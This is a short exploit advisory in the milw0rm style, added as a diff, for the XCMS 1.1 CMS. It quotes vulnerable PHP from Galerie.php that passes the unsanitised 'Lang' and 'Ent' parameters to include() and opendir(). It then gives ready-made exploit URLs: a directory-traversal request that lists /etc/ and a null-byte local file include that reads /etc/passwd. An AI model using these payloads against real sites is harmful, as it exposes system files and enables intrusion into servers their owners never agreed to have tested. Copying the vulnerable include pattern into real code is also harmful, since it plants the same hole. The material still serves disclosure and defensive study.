@@ -1,0 +1,33 @@
+#Author::   BlackNDoor | blackndoor@learntohell.net
+#Homepage:: www.learntohell.net
+#
+#Script::   XCMS : CMS
+#Version::  1.1
+#Type::     Remote Directory Listing & Local File Include
+#
+#Source::   http://groupeclan.free.fr/XCMS.zip
+
+#Bug::
+   -> Files:
+
+      /Module/Galerie.php.php
+
+   -> vulncode:
+
+      if(!isset($_GET['Lang'])) { $Lang="fr"; } else { $Lang=$_GET['Lang']; }
+      if(!isset($_GET['Ent'])) { $Ent='false'; } else { $Ent=$_GET['Ent']; }
+      include('Lang/' . $Lang . '.lang');  <--- Local File Include
+      if($Ent)
+      {
+	$Nb = -1;
+	$Dossier = opendir("../Images/$Lang/$Ent");  <--- Directory Listing
+
+
+#Exploit::
+
+   http://www.site.com/[path to XCMS]/Module/Galerie.php?Ent=../../../../../../etc/
+   http://www.site.com/[path to XCMS]/Module/Galerie.php?Lang=../../../../../../etc/passwd%00
+
+#thanks:: str0ke
+
+# milw0rm.com [2007-06-30]
